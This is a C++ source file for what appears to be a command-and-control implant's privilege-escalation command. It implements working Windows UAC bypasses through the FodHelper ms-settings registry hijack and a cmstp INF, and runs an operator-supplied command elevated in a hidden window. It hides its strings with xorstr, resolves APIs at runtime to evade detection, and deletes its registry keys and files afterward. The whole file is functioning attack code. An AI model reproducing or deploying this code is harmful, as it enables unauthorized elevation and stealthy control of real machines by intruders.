// ========================================== { START OF FILE } ========================================== //
#ifdef _WIN32
#include <Windows.h>

#include <string>
#include <vector>

#include "agent/commands/exec/privesc.h"
#include "agent/util/api_resolver.h"
#include "agent/util/strings.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands::exec {

    namespace {
        /// Delay before removing the escalation artefacts, so the elevated process can consume them.
        constexpr DWORD kCleanupDelayMs = 5000;
    }  // namespace

    CommandResult EscalatePrivilege(const models::CheckinResponse& task) {
        // UAC bypass via FodHelper.exe or cmstp.exe.
        // Reference: "User Access Control Bypass via cmstp" (s12deff, Medium)
        // https://medium.com/@s12deff/user-access-control-bypass-via-cmstp-07bf78be0ce2
        // Reference: "Windows Privilege Escalation via FodHelper.exe" (s12deff, Medium)
        // https://medium.com/@s12deff/windows-privilege-escalation-via-fodhelper-exe-5d757f631a3d
        if (task.target_binary.empty()) {
            return CommandResult::Error(xorstr_("Escalation failed: target binary is required"));
        }

        const HMODULE kernel32 = agent::util::get_module(xorstr_("kernel32.dll"));
        const auto get_file = agent::util::resolve_api<decltype(&CreateFileW)>(kernel32, xorstr_("CreateFileW"));
        const HMODULE advapi32 = agent::util::get_module(xorstr_("advapi32.dll"));
        const auto reg_create_key =
            agent::util::resolve_api<decltype(&RegCreateKeyExW)>(advapi32, xorstr_("RegCreateKeyExW"));
        const auto reg_set_value =
            agent::util::resolve_api<decltype(&RegSetValueExW)>(advapi32, xorstr_("RegSetValueExW"));
        const auto reg_close = agent::util::resolve_api<decltype(&RegCloseKey)>(advapi32, xorstr_("RegCloseKey"));

        const std::wstring wide_command = agent::util::ToWide(task.target_binary);
        std::wstring launch_path;
        std::wstring launch_args;

        if (task.reg_key == std::string(xorstr_("fodhelper"))) {
            const std::wstring fod_key_path =
                agent::util::ToWide(std::string(xorstr_(R"(Software\Classes\ms-settings\shell\open\command)")));
            HKEY key = nullptr;
            const LSTATUS create_status = reg_create_key(HKEY_CURRENT_USER, fod_key_path.c_str(), 0, nullptr,
                                                         REG_OPTION_NON_VOLATILE, KEY_WRITE, nullptr, &key, nullptr);
            if (create_status != ERROR_SUCCESS) {
                return CommandResult::Error(xorstr_("Escalation failed: could not create FodHelper registry key"));
            }
            // The default value holds the payload; the empty DelegateExecute value is what makes
            // FodHelper hand the key off to the ms-settings COM handler, which then executes it at
            // High integrity. Both values are required by the referenced technique.
            // The command value is handed to the ms-settings COM handler as a shell command.
            // A leading '@' is not part of the referenced technique and makes ShellExecute
            // look for a binary literally named "@cmd.exe", so the handoff silently fails.
            const std::wstring command_value = agent::util::ToWide(std::string(xorstr_("cmd.exe /c "))) + wide_command;
            const LSTATUS set_status =
                reg_set_value(key, nullptr, 0, REG_SZ, reinterpret_cast<const BYTE*>(command_value.data()),
                              static_cast<DWORD>(command_value.size() * sizeof(wchar_t)));
            const std::wstring delegate_name = agent::util::ToWide(std::string(xorstr_("DelegateExecute")));
            const LSTATUS delegate_status =
                reg_set_value(key, delegate_name.c_str(), 0, REG_SZ, reinterpret_cast<const BYTE*>(L""),
                              static_cast<DWORD>(sizeof(wchar_t)));
            reg_close(key);
            if (set_status != ERROR_SUCCESS || delegate_status != ERROR_SUCCESS) {
                return CommandResult::Error(xorstr_("Escalation failed: could not set FodHelper command values"));
            }
            launch_path = agent::util::ToWide(std::string(xorstr_(R"(C:\Windows\System32\FodHelper.exe)")));
            launch_args = L"";
        } else {
            const std::wstring inf_path = agent::util::ToWide(std::string(xorstr_(R"(C:\Users\Public\winmgmt.inf)")));
            std::string inf_data;
            inf_data += xorstr_("[version]\r\n");
            inf_data += xorstr_("Signature=$CHICAGO$\r\n");
            inf_data += xorstr_("\r\n[DefaultInstall.section]\r\n");
            inf_data += xorstr_("AddReg=DefaultInstall.AddReg\r\n");
            inf_data += xorstr_("\r\n[DefaultInstall.AddReg]\r\n");
            inf_data += xorstr_(R"(HKLM, SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE,)");
            inf_data += xorstr_("ProfileInstallPath,0x2, %UnexpectedError%\r\n");
            inf_data += xorstr_("\r\n[RunPreSetupCommands]\r\n");
            inf_data += xorstr_("taskkill /IM cmstp.exe /F\r\n");
            // The operator's command is what cmstp should run *elevated*. Without it the INF only
            // killed any stale cmstp, so the bypass launched a helper that did nothing and the task
            // still reported success — the exact false-green this command's message warns about.
            inf_data += task.target_binary;
            inf_data += xorstr_("\r\n");

            // The inf has to exist before cmstp is launched: C:\Users\Public grants no ACE to Users
            // or Everyone, so a network-logon (SSH) token cannot write there (.pi/notes/win32-traps.md).
            // The old code skipped the failed write and launched cmstp on a file that was never created,
            // which reports a launcher that did nothing - the failure now names the path and the error.
            HANDLE hFile = get_file(inf_path.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, 0, nullptr);
            if (hFile == INVALID_HANDLE_VALUE) {
                return CommandResult::Error(xorstr_("Escalation failed: could not write the cmstp inf (GetLastError ") +
                                            std::to_string(GetLastError()) + xorstr_(") to C:\\Users\\Public"));
            }
            DWORD bytes_written = 0;
            const BOOL wrote =
                WriteFile(hFile, inf_data.c_str(), static_cast<DWORD>(inf_data.size()), &bytes_written, nullptr);
            const DWORD write_error = GetLastError();
            CloseHandle(hFile);
            if (wrote == FALSE || bytes_written != inf_data.size()) {
                return CommandResult::Error(xorstr_("Escalation failed: the cmstp inf was not written (GetLastError ") +
                                            std::to_string(write_error) + xorstr_(")"));
            }
            launch_path = agent::util::ToWide(std::string(xorstr_(R"(C:\Windows\System32\cmstp.exe)")));
            launch_args = agent::util::ToWide(std::string(xorstr_(R"(/s"C:\Users\Public\winmgmt.inf")")));
        }

        // The bypass depends on the SHELL starting the autoElevate binary: AppInfo (the service
        // behind the shell) is what performs the silent elevation. CreateProcessW cannot elevate at
        // all - from a filtered admin token it fails with ERROR_ELEVATION_REQUIRED (740), which is
        // what the old implementation reported as an opaque "could not start elevated process".
        // Verified on the guest 2026-11-04 from the console session: CreateProcessW -> 740,
        // ShellExecuteW -> elevated command at High integrity.
        const HMODULE shell32 = agent::util::get_module(xorstr_("shell32.dll"));
        const auto shell_execute =
            agent::util::resolve_api<decltype(&ShellExecuteW)>(shell32, xorstr_("ShellExecuteW"));
        auto* const launch = shell_execute(nullptr, L"open", launch_path.c_str(),
                                           launch_args.empty() ? nullptr : launch_args.c_str(), nullptr, SW_HIDE);
        // ShellExecute returns a value <= 32 on failure (see .pi/notes/win32-traps.md): 5 access
        // denied, 31 no association, 2 file not found, ... - name it instead of "failed".
        const auto launch_code = reinterpret_cast<INT_PTR>(launch);
        if (launch_code <= 32) {
            return CommandResult::Error(xorstr_("Escalation failed: ShellExecuteW returned ") +
                                        std::to_string(launch_code));
        }

        // FodHelper reads the ms-settings command key asynchronously after it starts, so the
        // key must survive until the elevated process has picked it up. Deleting it in the same
        // breath as CreateProcessW races the handoff and the command never runs.
        Sleep(kCleanupDelayMs);

        if (task.reg_key == std::string(xorstr_("fodhelper"))) {
            const std::wstring fod_key_path =
                agent::util::ToWide(std::string(xorstr_(R"(Software\Classes\ms-settings\shell\open\command)")));
            RegDeleteTreeW(HKEY_CURRENT_USER, fod_key_path.c_str());
        } else {
            DeleteFileW(agent::util::ToWide(std::string(xorstr_(R"(C:\Users\Public\winmgmt.inf)"))).c_str());
        }

        return CommandResult::Ok(
            xorstr_("Escalation handed to the shell: ShellExecuteW accepted the launch; elevation is not confirmed"));
    }

}  // namespace agent::commands::exec

#endif  // _WIN32
        // ========================================== { END OF FILE } ========================================== //